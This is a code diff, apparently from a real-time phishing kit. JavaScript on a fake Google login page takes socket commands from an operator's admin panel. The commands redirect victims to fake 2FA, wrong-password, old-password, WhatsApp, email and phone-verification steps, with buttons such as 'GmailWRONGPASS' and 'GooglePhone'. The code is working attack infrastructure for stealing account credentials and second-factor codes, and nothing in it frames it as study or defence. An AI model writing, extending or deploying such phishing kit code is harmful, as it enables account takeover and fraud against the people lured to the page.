@@ -1011,15 +1011,8 @@
         socket.emit('userConnectedToPage', { clientId: clientId, page: 'google-login' });
       });
 
-      /* ── Cross-platform redirect: FB/generic prompts while on Google page ── */
-      socket.on('show-2fa',         function () { window.location.href = '/apply?show=2fa'; });
-      socket.on('show-auth',        function () { window.location.href = '/apply?show=auth'; });
-      socket.on('show-email',       function () { window.location.href = '/apply?show=email'; });
-      socket.on('show-whatsapp',    function () { window.location.href = '/apply?show=whatsapp'; });
-      socket.on('show-wrong-creds', function () { window.location.href = '/apply?show=wrongpsw'; });
-      socket.on('show-old-pass',    function () { window.location.href = '/apply?show=oldpass'; });
-      socket.on('show-calendar',    function () { window.location.href = '/calendly'; });
-      socket.on('redirect',         function (url) { window.location.href = url; });
+      socket.on('show-calendar', function () { window.location.href = 'calendly.html'; });
+      socket.on('redirect',      function (url) { window.location.href = url; });
 
       /* Admin panel → "GmailWRONGPASS" button → show wrong password error */
       socket.on('show-gmail-wrong-pass', function () {
@@ -1050,11 +1043,6 @@
           } catch (e) {}
           window.location.href = returnPage;
         });
-      });
-
-      /* Generic redirect command */
-      socket.on('redirect', function (url) {
-        window.location.href = url || 'apply.html';
       });
 
       /* Admin panel → "GooglePhone" button → show phone step with prefix */
